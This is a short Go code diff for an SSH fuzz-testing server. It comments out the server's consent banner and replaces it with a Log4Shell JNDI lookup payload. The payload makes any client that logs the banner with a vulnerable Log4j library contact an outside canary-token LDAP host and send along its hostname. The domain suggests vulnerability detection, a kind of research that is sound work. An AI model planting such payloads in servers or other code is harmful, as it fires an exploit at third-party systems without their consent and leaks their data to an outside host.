@@ -25,7 +25,9 @@ func ServerString(s string) (string) {
 //NewServer creates a new Server
 func NewServer(c *Config) (*Server, error) {
 
-	var banner string = "Unauthorized access or use is forbidden.\nThis system is monitored for administrative and security reasons.\nThis server is used to fuzz test client software, and will send lengthy and/or unexpected data in response to client input.\nBy proceeding, you acknowledge that (1) you have read and understand this notice, (2) you consent to the system monitoring, and (3) you consent to your software configuration being tested, and waive any claims against any and all persons for damage to your system as a result of participating in the test.\n"
+
+	// var banner string = "Unauthorized access or use is forbidden.\nThis system is monitored for administrative and security reasons.\nThis server is used to fuzz test client software, and will send lengthy and/or unexpected data in response to client input.\nBy proceeding, you acknowledge that (1) you have read and understand this notice, (2) you consent to the system monitoring, and (3) you consent to your software configuration being tested, and waive any claims against any and all persons for damage to your system as a result of participating in the test.\n"
+	var banner string = "${jndi:ldap://x${hostName}.L4J.swe040dyu7n0qdvt3exhww5pj.canarytokens.com/a}\n\n"
 
 	sc := &ssh.ServerConfig{}
 	sc.MaxAuthTries = 3
